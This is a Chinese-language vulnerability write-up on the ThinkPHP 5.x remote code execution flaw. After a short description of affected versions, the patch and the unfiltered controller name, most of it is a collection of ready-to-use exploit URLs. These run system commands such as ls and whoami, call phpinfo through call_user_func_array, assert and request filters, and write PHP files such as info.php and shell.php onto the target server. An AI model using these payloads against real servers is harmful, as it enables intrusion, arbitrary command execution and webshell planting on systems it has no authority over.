# ThinkPHP-命令执行漏洞

ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。
该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。

- 影响版本：
ThinkPHP 5.x (v5.0.23及v5.1.31以下版本)

Thinkphp v5.0.x补丁地址: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f


---------------------

- 漏洞产生：

```php
$controller       = strip_tags($result[1] ?: $this->rule->getConfig('default_controller'));
```
在修复之前程序未对控制器进行过滤，导致攻击者可以通过引入\符号来调用任意类方法。

-----------------------
- 漏洞利用POC

- **执行系统命令查看当前目录下文件**
方法一：
```exp
url/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-l
```
方法二：
```exp
url/public/index.php?s=/index/\think\request/cache&key=ls%20-l|system
```

- **执行phpinfo**
方法一：
```exp
url/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'
```
方法二：
```exp
url/public/index.php?s=/index/\think\request/cache&key=1|phpinfo
```
![tp.png][2]

- **写入info.php文件**
方法一：
```exp
url/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27<?php%20phpinfo();?>%27%20>%20info.php
```
方法二：
```exp
url/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=%3C?php%20phpinfo();?%3E
```

----------------------

- 漏洞环境源码：https://github.com/vulnspy/thinkphp-5.1.29

--------------------

# 以下为引用文

1.远程命令执行exp:

```exp
url/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

2.远程代码执行

- 执行代码phpinfo()
```exp
url/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
``` 

- 5.1.x版本执行phpinfo()
```exp
url/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert
``` 

- 5.1.x版本
```exp
url/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

- 5.0.x版本
```exp
url/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
```

3.写shell

```exp
url/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>
```
```exp
url/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php phpinfo();?>" >>2.php
```
